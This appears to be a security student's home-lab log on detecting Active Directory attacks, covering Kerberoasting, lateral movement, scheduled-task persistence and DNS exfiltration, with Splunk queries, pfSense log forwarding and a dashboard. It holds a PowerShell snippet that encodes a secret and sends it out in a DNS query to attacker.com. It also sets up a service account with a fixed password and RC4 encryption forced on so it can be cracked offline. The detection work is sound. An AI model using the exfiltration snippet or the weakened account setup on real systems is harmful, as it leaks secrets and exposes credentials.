# Week 3: Active Directory Attack Detection & Dashboard Building

**Date:** May 19 - June 2, 2026  
**Difficulty:** Beginner-Intermediate  
**Duration:** ~4 hours  
**Confidence After:** 6/10 — Multi-stage attack detection, PFSense pipeline, Splunk dashboards

---

## Overview

Week 3 focuses on **AD-specific attacks** and introduces **network-layer detection**. We create a Kerberoastable service account, detect Kerberoasting attempts, lateral movement, and build the first multi-panel Splunk dashboard. Additionally, we configure PFSense to forward firewall logs to Splunk, enabling network-level threat detection.

**Key Outcome:** Detect Kerberoasting (EventCode 4769 + RC4), lateral movement (EventCode 4624 Logon_Type=3), scheduled task persistence (EventCode 4698), and correlate DNS queries + network traffic for exfiltration detection.

---

## Active Directory Attacks Detected

| Attack | EventCode | Indicator | Detection |
|---|---|---|---|
| **Kerberoasting** | 4769 | Ticket_Encryption_Type=0x17 (RC4) | Count RC4 tickets per service account |
| **Lateral Movement** | 4624 | Logon_Type=3 from unusual source | Track Type 3 logons to identify movement |
| **Scheduled Task Persistence** | 4698 | Task_Name in Security log | Alert on new scheduled tasks |
| **Account Creation** | 4720/4732 | New account + Admin group | Correlate creation and escalation |

---

## Tasks Completed

### Task 1: Create Kerberoastable Service Account

**Setup:**
```powershell
# Create svc_sql service account
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true

# Set Service Principal Name (required for Kerberoasting)
setspn -a MSSQLSvc/DC-01.lab.local:1433 lab\svc_sql

# Force RC4 encryption (vulnerable to offline cracking)
Set-ADUser svc_sql -add @{'msDS-SupportedEncryptionTypes'=4}

# Verify SPN set
setspn -l lab\svc_sql
```

**Why RC4?** RC4 encryption can be cracked offline; AES is not.

### Task 2: Simulate and Detect Kerberoasting

**Attack:**
```powershell
Invoke-AtomicTest T1558.003 -TestNumbers 5 -PromptForInputArgs
# Targets: MSSQLSvc/DC-01.lab.local:1433
```

**Detection Query:**
```spl
index=windows EventCode=4769 Ticket_Encryption_Type=0x17 
| table _time, host, Account_Name, Service_Name, Ticket_Encryption_Type 
| sort -_time
```

**Result:** ✅ Detected RC4 ticket request (0x17) for svc_sql service account

**Screenshot Placeholders:**
- [ ] Screenshot: Splunk EventCode 4769 showing Ticket_Encryption_Type=0x17 (RC4)
- [ ] Screenshot: Alert firing when RC4 ticket detected

### Task 3: Detect Lateral Movement (EventCode 4624 Type 3)

**What is Logon_Type=3?**
- Type 3 = Network logon (SMB, RDP over network)
- Legitimate: Users accessing network shares, admins RDPing to servers
- Suspicious: Service accounts doing network logons, unusual source IPs

**Detection Query:**
```spl
index=windows EventCode=4624 Logon_Type=3 
| eval user=mvindex(Account_Name,1) 
| table _time, host, user, Logon_Type, Source_Network_Address, Workstation_Name 
| sort -_time
```

**Baseline:** Filtered known admin accounts and expected service accounts to reduce noise.

**Result:** ✅ Can track lateral movement chains (machine A → machine B → machine C)

**Screenshot Placeholders:**
- [ ] Screenshot: Splunk showing Type 3 logons with source and destination IPs

### Task 4: Enable and Detect Scheduled Task Persistence

**Problem:** EventCode 4698 wasn't appearing (audit policy gap)

**Fix:**
```powershell
# On DC01, enable via GPO
# Computer Configuration → Policies → Windows Settings → Security Settings → 
# Advanced Audit Policy Configuration → Audit Policies → Object Access → 
# Audit Other Object Access Events (Success + Failure)
gpupdate /force
```

**Simulation:**
```powershell
Invoke-AtomicTest T1053.005-2
# Creates task named "spawn" that runs malicious command
```

**Detection Query:**
```spl
index=windows EventCode=4698 
| table _time, host, Account_Name, Task_Name 
| sort -_time
```

**Result:** ✅ Detected new scheduled task creation by attacker account

**Screenshot Placeholders:**
- [ ] Screenshot: EventCode 4698 showing "spawn" task created by attacker
- [ ] Screenshot: Task Scheduler showing malicious task properties

### Task 5: Configure PFSense → Splunk Syslog Pipeline

**Objective:** Send firewall logs from PFSense to Splunk for network-layer detection

**Steps:**
1. Enabled syslog on PFSense: Status → System Logs → Settings
2. Changed log format to BSD (RFC 3164) for compatibility
3. Set syslog destination: Splunk (10.10.20.3:5014)
4. Created UDP input on Splunk listening on port 5014
5. Set sourcetype to `pfsense`

**Challenge:** TA-pfsense add-on didn't parse filterlog format correctly

**Solution:** Created custom field extraction `REPORT-pfsense_filterlog_fields` extracting:
- interface, reason, action, direction, ip_version, protocol, src_ip, dst_ip, src_port, dst_port

**Result:** ✅ PFSense logs now flowing into `index=pfsense` with parsed fields

**Screenshot Placeholders:**
- [ ] Screenshot: PFSense Status → System Logs → Syslog configuration
- [ ] Screenshot: Splunk Data Inputs → UDP 5014 showing pfsense sourcetype

### Task 6: Simulate and Detect DNS Exfiltration

**Attack Technique (T1048.003):**
- Encode secret data in DNS subdomain labels
- Attacker controls DNS server; can extract data from query itself
- Firewall might block outbound traffic but allows DNS queries

**Simulation:**
```powershell
# Encode secret message in Base64 and create DNS query
$secret = "AdminPassword123="
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($secret))
Resolve-DnsName "$encoded.attacker.com" -ErrorAction SilentlyContinue
```

**Dual-Source Correlation:**

**Source 1: Sysmon (Endpoint)**
```spl
index=windows EventCode=22 QueryName="*.attacker.com"
| where QueryResults="-" 
| eval subdomain_length=len(QueryName) 
| where subdomain_length > 30
| table _time, host, QueryName, subdomain_length
```

**Source 2: PFSense (Network)**
```spl
index=pfsense dst_port=53 dst_ip="attacker_ns_ip"
| stats count by src_ip, dst_ip, action
```

**Result:** ✅ Detected Base64-encoded subdomain + NXDOMAIN response pattern (data already exfiltrated in query)

**Screenshot Placeholders:**
- [ ] Screenshot: Sysmon EventCode 22 showing Base64-encoded DNS query
- [ ] Screenshot: PFSense filterlog showing DNS traffic to attacker nameserver
- [ ] Screenshot: Decoded Base64 revealing secret message

### Task 7: Build AD Health Monitor Dashboard

**5-Panel Dashboard:**

1. **Failed Logons Over Time** (EventCode 4625 trend)
2. **Network Logons / Lateral Movement** (EventCode 4624 Type=3)
3. **New Accounts Created** (EventCode 4720)
4. **Kerberoasting Attempts** (EventCode 4769 with RC4)
5. **Scheduled Tasks Created** (EventCode 4698)

**Dashboard Layout:** Single-row panels, color-coded by threat level

**Result:** ✅ Operations team can see AD health at a glance; anomalies immediately visible

**Screenshot Placeholders:**
- [ ] Screenshot: Full AD Health Monitor dashboard showing all 5 panels
- [ ] Screenshot: Single panel detail showing Kerberoasting detection spike

---

## Deferred Task: LSASS Credential Dumping (T1003.001)

**Problem:** Attempted to detect LSASS dump (comsvcs.dll method) but got no Sysmon telemetry

**Root Cause:** EventCode 10 (Process Access) not configured in Sysmon

**Decision:** Defer to Week 6 when we revisit Sysmon advanced configuration

---

## Key Learnings

- **Encryption type matters:** RC4 (0x17) vs AES (0x12) reveals attack technique
- **Logon_Type is critical:** Type 3 = network access; baseline first to find anomalies
- **Audit policies have gaps:** EventCode 4698 required specific GPO setting
- **Network + endpoint correlation is powerful:** DNS exfiltration needs both Sysmon + firewall logs
- **Dashboards provide operational visibility:** Analysts don't need to write queries every time

---

## Splunk Queries Built

| Detection | Confidence |
|---|---|
| Kerberoasting (RC4 tickets) | Very High |
| Lateral Movement (Type 3 logons) | High |
| Scheduled Task Persistence | Very High |
| DNS Exfiltration (Base64 + NXDOMAIN) | High |

---

**Week 3 Status:** ✅ COMPLETE (T1003.001 deferred to Week 6)  
**Confidence:** 6/10  
**Next Session:** June 2-3, 2026 (Week 4)